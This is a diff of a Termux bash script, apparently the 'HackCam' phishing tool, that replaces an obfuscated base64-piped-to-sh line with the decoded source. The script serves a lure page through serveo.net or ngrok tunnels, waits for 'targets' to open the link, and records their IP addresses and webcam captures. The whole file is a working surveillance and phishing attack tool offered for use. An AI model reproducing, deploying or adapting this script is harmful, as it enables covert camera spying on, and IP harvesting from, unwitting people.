@@ -1,1 +1,261 @@
-base64 -d <<< Y2xlYXIKdGVybXV4LXNldHVwLXN0b3JhZ2UKcGtnIGluc3RhbGwgcGhwIC15CmNsZWFyCnRyYXAgJ3ByaW50ZiAiXG4iO3N0b3AnIDIKCmJhbm5lcigpIHsKCmVjaG8gJwoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICBfXwogICAgICAgICAgICAgICAgICAgICAgICAgX18gL18vXF9fXwogICAgICAgICAgICAgICAgICAgICAgICAvX18vW11cL19fL3xvLV8KICAgICAgICAgICAgICAgICAgICAgICAgfCAgICBfICAgICB8fCAgIC1fICAKICAgICAgICAgICAgICAgICAgICAgICAgfCAgKChfKSkgICB8fCAgICAgLV8KICAgICAgICAgICAgICAgICAgICAgICAgfF9fX19fX19fX198LwoKICAgICAgICAgCuKWiOKWiOKVl+KWkeKWkeKWiOKWiOKVl+KWkeKWiOKWiOKWiOKWiOKWiOKVl+KWkeKWkeKWiOKWiOKWiOKWiOKWiOKVl+KWkeKWiOKWiOKVl+KWkeKWkeKWiOKWiOKVlwrilojilojilZHilpHilpHilojilojilZHilojilojilZTilZDilZDilojilojilZfilojilojilZTilZDilZDilojilojilZfilojilojilZHilpHilojilojilZTilZ0K4paI4paI4paI4paI4paI4paI4paI4pWR4paI4paI4paI4paI4paI4paI4paI4pWR4paI4paI4pWR4paR4paR4pWa4pWQ4pWd4paI4paI4paI4paI4paI4pWQ4pWd4paRCuKWiOKWiOKVlOKVkOKVkOKWiOKWiOKVkeKWiOKWiOKVlOKVkOKVkOKWiOKWiOKVkeKWiOKWiOKVkeKWkeKWkeKWiOKWiOKVl+KWiOKWiOKVlOKVkOKWiOKWiOKVl+KWkQrilojilojilZHilpHilpHilojilojilZHilojilojilZHilpHilpHilojilojilZHilZrilojilojilojilojilojilZTilZ3ilojilojilZHilpHilZrilojilojilZcK4pWa4pWQ4pWd4paR4paR4pWa4pWQ4pWd4pWa4pWQ4pWd4paR4paR4pWa4pWQ4pWd4paR4pWa4pWQ4pWQ4pWQ4pWQ4pWd4paR4pWa4pWQ4pWd4paR4paR4pWa4pWQ4pWdCgrilpHilojilojilojilojilojilZfilpHilpHilojilojilojilojilojilZfilpHilojilojilojilZfilpHilpHilpHilojilojilojilZcK4paI4paI4pWU4pWQ4pWQ4paI4paI4pWX4paI4paI4pWU4pWQ4pWQ4paI4paI4pWX4paI4paI4paI4paI4pWX4paR4paI4paI4paI4paI4pWRCuKWiOKWiOKVkeKWkeKWkeKVmuKVkOKVneKWiOKWiOKWiOKWiOKWiOKWiOKWiOKVkeKWiOKWiOKVlOKWiOKWiOKWiOKWiOKVlOKWiOKWiOKVkQrilojilojilZHilpHilpHilojilojilZfilojilojilZTilZDilZDilojilojilZHilojilojilZHilZrilojilojilZTilZ3ilojilojilZEK4pWa4paI4paI4paI4paI4paI4pWU4pWd4paI4paI4pWR4paR4paR4paI4paI4pWR4paI4paI4pWR4paR4pWa4pWQ4pWd4paR4paI4paI4pWRCuKWkeKVmuKVkOKVkOKVkOKVkOKVneKWkeKVmuKVkOKVneKWkeKWkeKVmuKVkOKVneKVmuKVkOKVneKWkeKWkeKWkeKWkeKWkeKVmuKVkOKVnSYgdjEuMSAnIHxsb2xjYXQKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKZWNobyAiICIKcHJpbnRmICIgICAgICBcZVsxOzc3bSB2MS4wIGNvZGVkIGJ5IEVycm9yLUZvci1Zb3VcZVswbSBcbiIKcHJpbnRmICIgICAgICAgICAgXGVbMTs3N20gdjEuMSBUaGlzIHJlYm9ybiBzY3JpcHQgYnkgeyBFUlJPUiB9XGVbMG0gXG4iCgpwcmludGYgIlxuIgoKZWNobyAiICAgICAgTjA3Mzo+IFBMRUFTRSBUVVJOIE9OIFlPVVIgSE9UU1BPVCAKICAgICAgICAgICAgICAgICAgIE9SIEVMU0UgWU9VIERPTlQgR0VUIExJTksuLi4uISIKCn0KCnN0b3AoKSB7CmNoZWNrbmdyb2s9JChwcyBhdXggfCBncmVwIC1vICJuZ3JvayIgfCBoZWFkIC1uMSkKY2hlY2twaHA9JChwcyBhdXggfCBncmVwIC1vICJwaHAiIHwgaGVhZCAtbjEpCmNoZWNrc3NoPSQocHMgYXV4IHwgZ3JlcCAtbyAic3NoIiB8IGhlYWQgLW4xKQppZiBbWyAkY2hlY2tuZ3JvayA9PSAqJ25ncm9rJyogXV07IHRoZW4KcGtpbGwgLWYgLTIgbmdyb2sgPiAvZGV2L251bGwgMj4mMQpraWxsYWxsIC0yIG5ncm9rID4gL2Rldi9udWxsIDI+JjEKZmkKCmlmIFtbICRjaGVja3BocCA9PSAqJ3BocCcqIF1dOyB0aGVuCmtpbGxhbGwgLTIgcGhwID4gL2Rldi9udWxsIDI+JjEKZmkKaWYgW1sgJGNoZWNrc3NoID09IConc3NoJyogXV07IHRoZW4Ka2lsbGFsbCAtMiBzc2ggPiAvZGV2L251bGwgMj4mMQpmaQpleGl0IDEKCn0KCmRlcGVuZGVuY2llcygpIHsKCgpjb21tYW5kIC12IHBocCA+IC9kZXYvbnVsbCAyPiYxIHx8IHsgZWNobyA+JjIgIkkgcmVxdWlyZSBwaHAgYnV0IGl0J3Mgbm90IGluc3RhbGxlZC4gSW5zdGFsbCBpdC4gQWJvcnRpbmcuIjsgZXhpdCAxOyB9CiAKCgp9CgpjYXRjaF9pcCgpIHsKCmlwPSQoZ3JlcCAtYSAnSVA6JyBpcC50eHQgfCBjdXQgLWQgIiAiIC1mMiB8IHRyIC1kICdccicpCklGUz0kJ1xuJwpwcmludGYgIlxlWzE7OTNtW1xlWzBtXGVbMTs3N20rXGVbMG1cZVsxOzkzbV0gSVA6XGVbMG1cZVsxOzc3bSAlc1xlWzBtXG4iICRpcAoKY2F0IGlwLnR4dCA+PiBzYXZlZC5pcC50eHQKCgp9CgpjaGVja2ZvdW5kKCkgewoKcHJpbnRmICJcbiIKcHJpbnRmICJcZVsxOzkybVtcZVswbVxlWzE7NzdtKlxlWzBtXGVbMTs5Mm1dIFdhaXRpbmcgdGFyZ2V0cyxcZVswbVxlWzE7NzdtIFByZXNzIEN0cmwgKyBDIHRvIGV4aXQuLi5cZVswbVxuIgp3aGlsZSBbIHRydWUgXTsgZG8KCgppZiBbWyAtZSAiaXAudHh0IiBdXTsgdGhlbgpwcmludGYgIlxuXGVbMTs5Mm1bXGVbMG0rXGVbMTs5Mm1dIFRhcmdldCBvcGVuZWQgdGhlIGxpbmshXG4iCmNhdGNoX2lwCnJtIC1yZiBpcC50eHQKCmZpCgpzbGVlcCAwLjUKCmlmIFtbIC1lICJMb2cubG9nIiBdXTsgdGhlbgpwcmludGYgIlxuXGVbMTs5Mm1bXGVbMG0rXGVbMTs5Mm1dIENhbSBmaWxlIHJlY2VpdmVkIVxlWzBtXG4iCnJtIC1yZiBMb2cubG9nCmZpCnNsZWVwIDAuNQoKZG9uZSAKCn0KCgpzZXJ2ZXIoKSB7Cgpjb21tYW5kIC12IHNzaCA+IC9kZXYvbnVsbCAyPiYxIHx8IHsgZWNobyA+JjIgIkkgcmVxdWlyZSBzc2ggYnV0IGl0J3Mgbm90IGluc3RhbGxlZC4gSW5zdGFsbCBpdC4gQWJvcnRpbmcuIjsgZXhpdCAxOyB9CgpwcmludGYgIlxlWzE7NzdtW1xlWzBtXGVbMTs5M20rXGVbMG1cZVsxOzc3bV0gU3RhcnRpbmcgU2VydmVvLi4uXGVbMG1cbiIKCmlmIFtbICRjaGVja3BocCA9PSAqJ3BocCcqIF1dOyB0aGVuCmtpbGxhbGwgLTIgcGhwID4gL2Rldi9udWxsIDI+JjEKZmkKCmlmIFtbICRzdWJkb21haW5fcmVzcCA9PSB0cnVlIF1dOyB0aGVuCgokKHdoaWNoIHNoKSAtYyAnc3NoIC1vIFN0cmljdEhvc3RLZXlDaGVja2luZz1ubyAtbyBTZXJ2ZXJBbGl2ZUludGVydmFsPTYwIC1SICckc3ViZG9tYWluJzo4MDpsb2NhbGhvc3Q6MzMzMyBzZXJ2ZW8ubmV0ICAyPiAvZGV2L251bGwgPiBzZW5kbGluayAnICYKCnNsZWVwIDgKZWxzZQokKHdoaWNoIHNoKSAtYyAnc3NoIC1vIFN0cmljdEhvc3RLZXlDaGVja2luZz1ubyAtbyBTZXJ2ZXJBbGl2ZUludGVydmFsPTYwIC1SIDgwOmxvY2FsaG9zdDozMzMzIHNlcnZlby5uZXQgMj4gL2Rldi9udWxsID4gc2VuZGxpbmsgJyAmCgpzbGVlcCA4CmZpCnByaW50ZiAiXGVbMTs3N21bXGVbMG1cZVsxOzMzbStcZVswbVxlWzE7NzdtXSBTdGFydGluZyBwaHAgc2VydmVyLi4uIChsb2NhbGhvc3Q6MzMzMylcZVswbVxuIgpmdXNlciAtayAzMzMzL3RjcCA+IC9kZXYvbnVsbCAyPiYxCnBocCAtUyBsb2NhbGhvc3Q6MzMzMyA+IC9kZXYvbnVsbCAyPiYxICYKc2xlZXAgMwpzZW5kX2xpbms9JChncmVwIC1vICJodHRwczovL1swLTlhLXpdKlwuc2VydmVvLm5ldCIgc2VuZGxpbmspCnByaW50ZiAnXGVbMTs5M21bXGVbMG1cZVsxOzc3bStcZVswbVxlWzE7OTNtXSBEaXJlY3QgbGluazpcZVswbVxlWzE7NzdtICVzXG4nICRzZW5kX2xpbmsKCn0KCgpwYXlsb2FkX25ncm9rKCkgewoKbGluaz0kKGN1cmwgLXMgLU4gaHR0cDovLzEyNy4wLjAuMTo0MDQwL2FwaS90dW5uZWxzIHwgZ3JlcCAtbyAiaHR0cHM6Ly9bMC05YS16XSpcLm5ncm9rLmlvIikKc2VkICdzK2ZvcndhcmRpbmdfbGluaysnJGxpbmsnK2cnIGhhY2tjYW0uaHRtbCA+IGluZGV4Mi5odG1sCnNlZCAncytmb3J3YXJkaW5nX2xpbmsrJyRsaW5rJytnJyB0ZW1wbGF0ZS5waHAgPiBpbmRleC5waHAKCgp9CgpuZ3Jva19zZXJ2ZXIoKSB7CgoKaWYgW1sgLWUgbmdyb2sgXV07IHRoZW4KZWNobyAiIgplbHNlCmNvbW1hbmQgLXYgdW56aXAgPiAvZGV2L251bGwgMj4mMSB8fCB7IGVjaG8gPiYyICJJIHJlcXVpcmUgdW56aXAgYnV0IGl0J3Mgbm90IGluc3RhbGxlZC4gSW5zdGFsbCBpdC4gQWJvcnRpbmcuIjsgZXhpdCAxOyB9CmNvbW1hbmQgLXYgd2dldCA+IC9kZXYvbnVsbCAyPiYxIHx8IHsgZWNobyA+JjIgIkkgcmVxdWlyZSB3Z2V0IGJ1dCBpdCdzIG5vdCBpbnN0YWxsZWQuIEluc3RhbGwgaXQuIEFib3J0aW5nLiI7IGV4aXQgMTsgfQpwcmludGYgIlxlWzE7OTJtW1xlWzBtK1xlWzE7OTJtXSBEb3dubG9hZGluZyBOZ3Jvay4uLlxuIgphcmNoPSQodW5hbWUgLWEgfCBncmVwIC1vICdhcm0nIHwgaGVhZCAtbjEpCmFyY2gyPSQodW5hbWUgLWEgfCBncmVwIC1vICdBbmRyb2lkJyB8IGhlYWQgLW4xKQppZiBbWyAkYXJjaCA9PSAqJ2FybScqIF1dIHx8IFtbICRhcmNoMiA9PSAqJ0FuZHJvaWQnKiBdXSA7IHRoZW4Kd2dldCBodHRwczovL2Jpbi5lcXVpbm94LmlvL2MvNFZtRHpBN2lhSGIvbmdyb2stc3RhYmxlLWxpbnV4LWFybS56aXAgPiAvZGV2L251bGwgMj4mMQoKaWYgW1sgLWUgbmdyb2stc3RhYmxlLWxpbnV4LWFybS56aXAgXV07IHRoZW4KdW56aXAgbmdyb2stc3RhYmxlLWxpbnV4LWFybS56aXAgPiAvZGV2L251bGwgMj4mMQpjaG1vZCAreCBuZ3JvawpybSAtcmYgbmdyb2stc3RhYmxlLWxpbnV4LWFybS56aXAKZWxzZQpwcmludGYgIlxlWzE7OTNtWyFdIERvd25sb2FkIGVycm9yLi4uIFRlcm11eCwgcnVuOlxlWzBtXGVbMTs3N20gcGtnIGluc3RhbGwgd2dldFxlWzBtXG4iCmV4aXQgMQpmaQoKZWxzZQp3Z2V0IGh0dHBzOi8vYmluLmVxdWlub3guaW8vYy80Vm1EekE3aWFIYi9uZ3Jvay1zdGFibGUtbGludXgtMzg2LnppcCA+IC9kZXYvbnVsbCAyPiYxIAppZiBbWyAtZSBuZ3Jvay1zdGFibGUtbGludXgtMzg2LnppcCBdXTsgdGhlbgp1bnppcCBuZ3Jvay1zdGFibGUtbGludXgtMzg2LnppcCA+IC9kZXYvbnVsbCAyPiYxCmNobW9kICt4IG5ncm9rCnJtIC1yZiBuZ3Jvay1zdGFibGUtbGludXgtMzg2LnppcAplbHNlCnByaW50ZiAiXGVbMTs5M21bIV0gRG93bmxvYWQgZXJyb3IuLi4gXGVbMG1cbiIKZXhpdCAxCmZpCmZpCmZpCgpwcmludGYgIlxlWzE7OTJtW1xlWzBtK1xlWzE7OTJtXSBTdGFydGluZyBwaHAgc2VydmVyLi4uXG4iCnBocCAtUyAxMjcuMC4wLjE6MzMzMyA+IC9kZXYvbnVsbCAyPiYxICYgCnNsZWVwIDIKcHJpbnRmICJcZVsxOzkybVtcZVswbStcZVsxOzkybV0gU3RhcnRpbmcgbmdyb2sgc2VydmVyLi4uXG4iCi4vbmdyb2sgaHR0cCAzMzMzID4gL2Rldi9udWxsIDI+JjEgJgpzbGVlcCAxMAoKbGluaz0kKGN1cmwgLXMgLU4gaHR0cDovLzEyNy4wLjAuMTo0MDQwL2FwaS90dW5uZWxzIHwgZ3JlcCAtbyAiaHR0cHM6Ly9bMC05YS16XSpcLm5ncm9rLmlvIikKcHJpbnRmICJcZVsxOzkybVtcZVswbSpcZVsxOzkybV0gRGlyZWN0IGxpbms6XGVbMG1cZVsxOzc3bSAlc1xlWzBtXG4iICRsaW5rCgpwYXlsb2FkX25ncm9rCmNoZWNrZm91bmQKfQoKc3RhcnQxKCkgewppZiBbWyAtZSBzZW5kbGluayBdXTsgdGhlbgpybSAtcmYgc2VuZGxpbmsKZmkKCnByaW50ZiAiXG4iCnByaW50ZiAiXGVbMTs5Mm1bXGVbMG1cZVsxOzc3bTAxXGVbMG1cZVsxOzkybV1cZVswbVxlWzE7OTNtIFNlcnZlby5uZXRcZVswbVxuIgpwcmludGYgIlxlWzE7OTJtW1xlWzBtXGVbMTs3N20wMlxlWzBtXGVbMTs5Mm1dXGVbMG1cZVsxOzkzbSBOZ3Jva1xlWzBtXG4iCmRlZmF1bHRfb3B0aW9uX3NlcnZlcj0iMSIKcmVhZCAtcCAkJ1xuXGVbMTs5Mm1bXGVbMG1cZVsxOzc3bStcZVswbVxlWzE7OTJtXSBDaG9vc2UgYSBQb3J0IEZvcndhcmRpbmcgb3B0aW9uOiBcZVswbScgb3B0aW9uX3NlcnZlcgpvcHRpb25fc2VydmVyPSIke29wdGlvbl9zZXJ2ZXI6LSR7ZGVmYXVsdF9vcHRpb25fc2VydmVyfX0iCmlmIFtbICRvcHRpb25fc2VydmVyIC1lcSAxIF1dOyB0aGVuCgpjb21tYW5kIC12IHBocCA+IC9kZXYvbnVsbCAyPiYxIHx8IHsgZWNobyA+JjIgIkkgcmVxdWlyZSBzc2ggYnV0IGl0J3Mgbm90IGluc3RhbGxlZC4gSW5zdGFsbCBpdC4gQWJvcnRpbmcuIjsgZXhpdCAxOyB9CnN0YXJ0CgplbGlmIFtbICRvcHRpb25fc2VydmVyIC1lcSAyIF1dOyB0aGVuCm5ncm9rX3NlcnZlcgplbHNlCnByaW50ZiAiXGVbMTs5M20gWyFdIEludmFsaWQgb3B0aW9uIVxlWzBtXG4iCnNsZWVwIDEKY2xlYXIKc3RhcnQxCmZpCgp9CgoKcGF5bG9hZCgpIHsKCnNlbmRfbGluaz0kKGdyZXAgLW8gImh0dHBzOi8vWzAtOWEtel0qXC5zZXJ2ZW8ubmV0IiBzZW5kbGluaykKCnNlZCAncytmb3J3YXJkaW5nX2xpbmsrJyRzZW5kX2xpbmsnK2cnIGhhY2tjYW0uaHRtbCA+IGluZGV4Mi5odG1sCnNlZCAncytmb3J3YXJkaW5nX2xpbmsrJyRzZW5kX2xpbmsnK2cnIHRlbXBsYXRlLnBocCA+IGluZGV4LnBocAoKCn0KCnN0YXJ0KCkgewoKZGVmYXVsdF9jaG9vc2Vfc3ViPSJZIgpkZWZhdWx0X3N1YmRvbWFpbj0iZ3JhYmNhbSRSQU5ET00iCgpwcmludGYgJ1xlWzE7MzNtW1xlWzBtXGVbMTs3N20rXGVbMG1cZVsxOzMzbV0gQ2hvb3NlIHN1YmRvbWFpbj8gKERlZmF1bHQ6XGVbMG1cZVsxOzc3bSBbWS9uXSBcZVswbVxlWzE7MzNtKTogXGVbMG0nCnJlYWQgY2hvb3NlX3N1YgpjaG9vc2Vfc3ViPSIke2Nob29zZV9zdWI6LSR7ZGVmYXVsdF9jaG9vc2Vfc3VifX0iCmlmIFtbICRjaG9vc2Vfc3ViID09ICJZIiB8fCAkY2hvb3NlX3N1YiA9PSAieSIgfHwgJGNob29zZV9zdWIgPT0gIlllcyIgfHwgJGNob29zZV9zdWIgPT0gInllcyIgXV07IHRoZW4Kc3ViZG9tYWluX3Jlc3A9dHJ1ZQpwcmludGYgJ1xlWzE7MzNtW1xlWzBtXGVbMTs3N20rXGVbMG1cZVsxOzMzbV0gU3ViZG9tYWluOiAoRGVmYXVsdDpcZVswbVxlWzE7NzdtICVzIFxlWzBtXGVbMTszM20pOiBcZVswbScgJGRlZmF1bHRfc3ViZG9tYWluCnJlYWQgc3ViZG9tYWluCnN1YmRvbWFpbj0iJHtzdWJkb21haW46LSR7ZGVmYXVsdF9zdWJkb21haW59fSIKZmkKCnNlcnZlcgpwYXlsb2FkCmNoZWNrZm91bmQKCn0KCmJhbm5lcgpkZXBlbmRlbmNpZXMKc3RhcnQxCg== | sh
+clear
+termux-setup-storage
+pkg install php -y
+clear
+trap 'printf "\n";stop' 2
+
+banner() {
+
+echo '
+
+                             __
+                         __ /_/\___
+                        /__/[]\/__/|o-_
+                        |    _     ||   -_  
+                        |  ((_))   ||     -_
+                        |__________|/
+
+         
+██╗░░██╗░█████╗░░█████╗░██╗░░██╗
+██║░░██║██╔══██╗██╔══██╗██║░██╔╝
+███████║███████║██║░░╚═╝█████═╝░
+██╔══██║██╔══██║██║░░██╗██╔═██╗░
+██║░░██║██║░░██║╚█████╔╝██║░╚██╗
+╚═╝░░╚═╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝
+
+░█████╗░░█████╗░███╗░░░███╗
+██╔══██╗██╔══██╗████╗░████║
+██║░░╚═╝███████║██╔████╔██║
+██║░░██╗██╔══██║██║╚██╔╝██║
+╚█████╔╝██║░░██║██║░╚═╝░██║
+░╚════╝░╚═╝░░╚═╝╚═╝░░░░░╚═╝& v1.1 ' |lolcat
+
+                                                                               
+echo " "
+printf "      \e[1;77m v1.0 coded by Error-For-You\e[0m \n"
+printf "          \e[1;77m v1.1 This reborn script by { ERROR }\e[0m \n"
+
+printf "\n"
+
+echo "      E4Y:> PLEASE TURN ON YOUR HOTSPOT 
+                   OR ELSE YOU DONT GET LINK....!"
+
+}
+
+stop() {
+checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
+checkphp=$(ps aux | grep -o "php" | head -n1)
+checkssh=$(ps aux | grep -o "ssh" | head -n1)
+if [[ $checkngrok == *'ngrok'* ]]; then
+pkill -f -2 ngrok > /dev/null 2>&1
+killall -2 ngrok > /dev/null 2>&1
+fi
+
+if [[ $checkphp == *'php'* ]]; then
+killall -2 php > /dev/null 2>&1
+fi
+if [[ $checkssh == *'ssh'* ]]; then
+killall -2 ssh > /dev/null 2>&1
+fi
+exit 1
+
+}
+
+dependencies() {
+
+
+command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
+ 
+
+
+}
+
+catch_ip() {
+
+ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
+IFS=$'\n'
+printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip
+
+cat ip.txt >> saved.ip.txt
+
+
+}
+
+checkfound() {
+
+printf "\n"
+printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
+while [ true ]; do
+
+
+if [[ -e "ip.txt" ]]; then
+printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
+catch_ip
+rm -rf ip.txt
+
+fi
+
+sleep 0.5
+
+if [[ -e "Log.log" ]]; then
+printf "\n\e[1;92m[\e[0m+\e[1;92m] Cam file received!\e[0m\n"
+rm -rf Log.log
+fi
+sleep 0.5
+
+done 
+
+}
+
+
+server() {
+
+command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
+
+printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Starting Serveo...\e[0m\n"
+
+if [[ $checkphp == *'php'* ]]; then
+killall -2 php > /dev/null 2>&1
+fi
+
+if [[ $subdomain_resp == true ]]; then
+
+$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R '$subdomain':80:localhost:3333 serveo.net  2> /dev/null > sendlink ' &
+
+sleep 8
+else
+$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net 2> /dev/null > sendlink ' &
+
+sleep 8
+fi
+printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Starting php server... (localhost:3333)\e[0m\n"
+fuser -k 3333/tcp > /dev/null 2>&1
+php -S localhost:3333 > /dev/null 2>&1 &
+sleep 3
+send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
+printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Direct link:\e[0m\e[1;77m %s\n' $send_link
+
+}
+
+
+payload_ngrok() {
+
+link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
+sed 's+forwarding_link+'$link'+g' hackcam.html > index2.html
+sed 's+forwarding_link+'$link'+g' template.php > index.php
+
+
+}
+
+ngrok_server() {
+
+
+if [[ -e ngrok ]]; then
+echo ""
+else
+command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
+command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
+printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\n"
+arch=$(uname -a | grep -o 'arm' | head -n1)
+arch2=$(uname -a | grep -o 'Android' | head -n1)
+if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
+wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1
+
+if [[ -e ngrok-stable-linux-arm.zip ]]; then
+unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
+chmod +x ngrok
+rm -rf ngrok-stable-linux-arm.zip
+else
+printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
+exit 1
+fi
+
+else
+wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
+if [[ -e ngrok-stable-linux-386.zip ]]; then
+unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
+chmod +x ngrok
+rm -rf ngrok-stable-linux-386.zip
+else
+printf "\e[1;93m[!] Download error... \e[0m\n"
+exit 1
+fi
+fi
+fi
+
+printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
+php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
+sleep 2
+printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
+./ngrok http 3333 > /dev/null 2>&1 &
+sleep 10
+
+link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
+printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
+
+payload_ngrok
+checkfound
+}
+
+start1() {
+if [[ -e sendlink ]]; then
+rm -rf sendlink
+fi
+
+printf "\n"
+printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
+default_option_server="1"
+read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a Port Forwarding option: \e[0m' option_server
+option_server="${option_server:-${default_option_server}}"
+if [[ $option_server -eq 1 ]]; then
+
+command -v php > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
+start
+
+elif [[ $option_server -eq 2 ]]; then
+ngrok_server
+else
+printf "\e[1;93m [!] Invalid option!\e[0m\n"
+sleep 1
+clear
+start1
+fi
+
+}
+
+
+payload() {
+
+send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
+
+sed 's+forwarding_link+'$send_link'+g' hackcam.html > index2.html
+sed 's+forwarding_link+'$send_link'+g' template.php > index.php
+
+
+}
+
+start() {
+
+default_choose_sub="Y"
+default_subdomain="grabcam$RANDOM"
+
+printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Choose subdomain? (Default:\e[0m\e[1;77m [Y/n] \e[0m\e[1;33m): \e[0m'
+read choose_sub
+choose_sub="${choose_sub:-${default_choose_sub}}"
+if [[ $choose_sub == "Y" || $choose_sub == "y" || $choose_sub == "Yes" || $choose_sub == "yes" ]]; then
+subdomain_resp=true
+printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Subdomain: (Default:\e[0m\e[1;77m %s \e[0m\e[1;33m): \e[0m' $default_subdomain
+read subdomain
+subdomain="${subdomain:-${default_subdomain}}"
+fi
+
+server
+payload
+checkfound
+
+}
+
+banner
+dependencies
+start1
